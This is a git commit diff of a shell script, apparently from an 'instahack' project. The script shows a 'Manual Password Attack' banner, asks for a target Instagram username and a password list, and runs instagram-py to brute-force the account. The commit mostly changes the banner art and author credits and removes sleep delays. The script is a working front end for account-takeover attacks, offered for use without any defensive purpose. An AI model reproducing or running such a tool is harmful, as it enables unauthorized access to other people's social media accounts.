8a42b10be6074f8cd3e603fd741edfc90d72ad2d
●┼WaSim Akram••✓⁩ <66058079+evildevill@users.noreply.github.com>
2021-02-19 05:28:50 +0500

    Manual.sh

--- main/manual.sh
+++ main/manual.sh
@@ -7,32 +7,30 @@ ylo='\033[1;33m'
 #coding section starts :)
 clear
 echo
- echo '                   _                 _   
- o                       | |               | |  
- _  _    , _|_  __,  | |     __,   __  | |  
- |  / |/ |  / \_|  /  |  |/ \   /  |  /    |/_) 
- |_/  |  |_/ \/ |_/\_/|_/|   |_/\_/|_/\___/| \_/
- [#] Manual Password Attack [#]
- ' |lolcat
+echo '
+ ____  _  _  ___  ____   __    _   _    __    ___  _  _ 
+(_  _)( \( )/ __)(_  _) /__\  ( )_( )  /__\  / __)( )/ )
+ _)(_  )  ( \__ \  )(  /(__)\  ) _ (  /(__)\( (__  )  ( 
+(____)(_)\_)(___/ (__)(__)(__)(_) (_)(__)(__)\___)(_)\_)
+              [#] Manual Password Attack [#]
+' |lolcat
 printf "\n"
-printf "                \e[101m\e[1;77m  >>  Script By EvilDevil W A S I << \e[0m\n"
+printf "                \e[101m\e[1;77m  >>  Script By Blckspidr << \e[0m\n"
 printf "\n"
-printf "  \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m youtube.com/Hackerwasi \e[100m\e[1;77m << \e[0m\n"
+printf "       \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Hacker wasii \e[100m\e[1;77m << \e[0m\n"
 printf "\n"
 echo
 read -p "[#] User Name : " usrnm
 echo
 read -p "[#] Enter Passlist Location : " inspass
 echo
-if [ $inspass = 0 ]                                             
+if [[ $inspass = 0 ]]                                             
 then
 echo -e  "$ylo >>> exiting........! Bye Bye :) <<<$rset"        
 else
 instagram-py --username $usrnm --password-list $inspass
 echo
-sleep 30.0
 cd $HOME
 fi
-sleep 30.0
 cd $HOME/instahack
 bash instahack.sh
